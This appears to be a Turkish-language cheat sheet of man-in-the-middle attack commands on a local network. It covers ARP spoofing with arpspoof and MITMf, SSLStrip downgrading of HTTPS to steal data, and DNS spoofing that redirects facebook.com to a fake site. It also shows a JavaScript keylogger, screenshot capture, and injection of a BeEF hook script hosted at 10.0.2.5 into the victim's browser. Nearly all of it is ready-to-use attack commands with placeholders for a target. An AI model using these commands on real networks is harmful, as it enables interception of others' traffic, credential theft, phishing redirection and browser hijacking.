## Man In The Middle

`echo 1 > /proc/sys/net/ipv4/ip_forward` yönlendirmesini yapmazsak hedek internete çıkamaz bize gelen verileri modeme aktarıyoruz.

`arpspoof -i <interface> -t <target> <modem_IP>` Hedefimize modemin MAC adresi ile benim MAC adresim aynı dedik.

`arpspoof -i <interface> -t <modem_IP> <target>` Modeme hedefin MAC adresi ile benim MAC adresim aynı dedik.

Hedefimizin trafiğini kendi üstümüzden geçirdik. ARP tablolarından görülebilir. linuxlarda ARP tablosunu görmek için `arp` Windowslarda ise `arp -a` komutu kullanılır.

### MITMF Kullanarak Man In The Middle Attack

`mitmf --arp --spoof --gateway <gateway_modem_IP> --target <target> -i <interface>`

> ex: `mitmf --arp --spoof --gatewat 192.168.1.1 --target 192.168.1.35 -i wlp3s0`

HTTPS Siteler için SSLStrip kullanılarak HTTPS kullanan siteleri HTTP ile açarak verileri o şekilde çalabiliriz yani HTTPS i HTTP ye indirgeyerek eğer arpspoof ile manüel olarak MITM yaptı isek HTTPS den HTTP ye indirgeme işleminide manüel olarak yapmamamız gerekmektedir. Eğer MITMF kullandı isek bunu MITMF yazılımı otamatik olarak yapar extra komut girmemize gerek yoktur.

**HSTS:** Bazı websiteleri HSTS sistemi kullanır bu sistem tarayıcılara HTTP ile değilde HTTPS ile bağlanmaları gerektiğini söyler ve HTTP ile bağlanamayız.

`File "/usr/share/mitmf/core/proxyplugins.py", line 112, in hook a = f(*args)`  Hatası alırsan şu komutu çalıştır, `pip install Twisted==15.5.0` (Twisted ın 15.5.0 sürümünü yükler python için)

#### MITMF DNS Attack (DNS Spoofing)

`mitmf --arp --spoof --gateway <modem_IP> --target <target> -i <interface> --dns`

> ex: `mitmf --arp --spoof --gateway <modem_IP> --target <target> -i wlan0 --dns`

/etc/mitmf/mitmf.conf dosyasını yapılandıracağız.

[[[A]]] yazan yerin altında dns yönlendirme işlemini yapabiliriz.

`*.facebook.com=192.168.1.45` facebook.com a gitmek isteyen hedefi 192.168.1.45 IP adresindeki cihaza 
yönlendirir cihazda web server çalışıyor ve üzerinde sahte bir web sitesi barınıyor olablir.

#### MITMF Screenshot

`mitmf --arp --spoof --gateway <modem_IP> --target <target> -i <interface> --screen` /var/log/mitmf dizinine kaydeder.

#### MITMF Keylogger

`mitmf --arp --spoof --gateway <modem_IP> --target <target> -i <interface> --jskeylogger` 

#### MITMF JavaSctipt Injection

`mitmf --arp --spoof --gateway <modem_IP> --target <target> -i <interface> --inject --js-payload 
"alert("HACKED");"` 

> `mitmf --arp --spoof --gateway <modem_IP> --target <target> -i <interface> --inject --js-url 
> http://10.0.2.5:3000/hook.js` man in the middle konumuna geçerek javascript enjekte ediyoruz hedefe ve 
> enjekte ettiğimiz dosya beef in oluşturmuş olduğu olta (hook) dosyası beef bağlantısı kazanmak için mükemmel 
> bir yöntem!

#### MITMF HTML File Inject

`mitmf --arp --spoof --gateway <modem_IP> --target <target> -i <interface> --inject --html-file /file.html` 

